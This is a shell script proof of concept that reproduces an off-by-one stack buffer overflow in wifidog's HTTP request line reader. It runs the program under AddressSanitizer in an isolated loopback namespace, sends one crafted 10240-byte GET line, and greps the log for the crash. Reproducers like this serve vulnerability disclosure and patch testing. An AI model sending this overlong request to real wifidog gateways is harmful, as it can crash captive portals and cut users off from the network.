#!/usr/bin/env sh
set -eu

ROOT_DIR="$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)"
WIFIDOG="$ROOT_DIR/src/wifidog"
CONF="$ROOT_DIR/poc/wifidog-loopback.conf"
LOG="$ROOT_DIR/poc/poc-readline-offbyone.log"

# libhttpd uses HTTP_MAX_LEN = 10240 for httpdReadRequest()'s line buffer.
LINE_LEN="${LINE_LEN:-10240}"

command -v unshare >/dev/null 2>&1 || { echo "error: unshare not found" >&2; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "error: python3 not found" >&2; exit 1; }

rm -f "$LOG"

LINE_LEN="$LINE_LEN" unshare -Urn sh -c "
set -eu
cd \"$ROOT_DIR\"
ip link set lo up
rm -f /tmp/wdctl-wifidog-poc.sock

ASAN_OPTIONS=abort_on_error=1:symbolize=0:halt_on_error=1 \"$WIFIDOG\" -f -c \"$CONF\" -d 0 >\"$LOG\" 2>&1 &
pid=\$!

for i in 1 2 3 4 5 6 7 8 9 10; do
  python3 - <<'PY' && break || true
import socket, sys
try:
    s = socket.create_connection(('127.0.0.1', 2060), timeout=0.2)
    s.close()
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  sleep 0.2
done

python3 - <<'PY'
import os, socket
line_len = int(os.environ.get('LINE_LEN', '10240'))
prefix = 'GET /'
suffix = ' HTTP/1.0'
fill_len = line_len - len(prefix) - len(suffix)
if fill_len < 0:
    raise SystemExit('LINE_LEN too small')
line = prefix + ('A' * fill_len) + suffix
assert len(line) == line_len
req = line + '\\n'
s = socket.create_connection(('127.0.0.1', 2060))
s.sendall(req.encode())
s.close()
PY

sleep 1
if kill -0 \"\$pid\" 2>/dev/null; then
  echo \"[poc] wifidog still running (no crash detected)\" >>\"$LOG\"
  kill \"\$pid\" 2>/dev/null || true
fi
wait \"\$pid\" || true
"

echo "Log: $LOG"
if command -v rg >/dev/null 2>&1; then
  rg -n "AddressSanitizer|stack-buffer-overflow|SUMMARY|_httpd_readLine" "$LOG" || true
fi

